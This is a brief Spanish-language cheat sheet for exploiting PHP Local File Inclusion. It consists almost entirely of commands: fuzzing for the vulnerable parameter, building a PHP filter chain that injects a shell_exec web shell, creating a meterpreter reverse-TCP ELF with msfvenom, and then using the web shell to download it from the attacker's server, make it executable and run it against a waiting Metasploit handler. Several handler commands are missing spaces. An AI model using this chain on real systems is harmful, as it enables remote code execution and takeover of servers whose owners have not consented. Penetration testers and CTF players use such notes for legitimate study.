# Local File Inclusion
## Se produce cuando las rutas pasadas a las sentencias include no se sanitizan correctamente.
Encontrar payload: 

```bash
wfuzz -c —hw 373 -w LFI-Jhaddix.txt -u “URL.php?PAYLOAD=FUZZ”
```

crear payload:

```bash
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'

python3 -m http.server
```

En la URL:

```bash
URL.[php?cmd=](http://realgob.dl/about.php?cmd=)<COMMAND>&file=<CONTENT_GENERATE>
```

Crear archivo .elf:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

En la URL pondremos lo siguiente:

```bash
URL.php?cmd=wget http://<IP>:8000/shell.elf -O /tmp/shell.elf&file=<CONTENT_GENERATE>
```

y comprobar con:

```bash
URL.[php?cmd=ls](http://realgob.dl/about.php?cmd=ls) -la /tmp/shell.elf&file=<CONTENT_GENERATE>
```

Le damos permisos de ejecución:

```bash
URL[.php?cmd=chmod %2Bx %2Ftmp%2Fshell.elf](http://realgob.dl/about.php?cmd=chmod%20%2Bx%20%2Ftmp%2Fshell.elf) &file=<CONTENT_GENERATE>
```

ponemos a la escucha:

```bash
msfconsole -q

usemulti/handler
setLPORT<PORT>
setLHOST<IP>
setPAYLOADlinux/x64/meterpreter/reverse_tcp
run
```

y ejecutamos la shell:

```bash
URL.php?cmd=/tmp/shell.elf&file=<CONTENT_GENERATE>
```
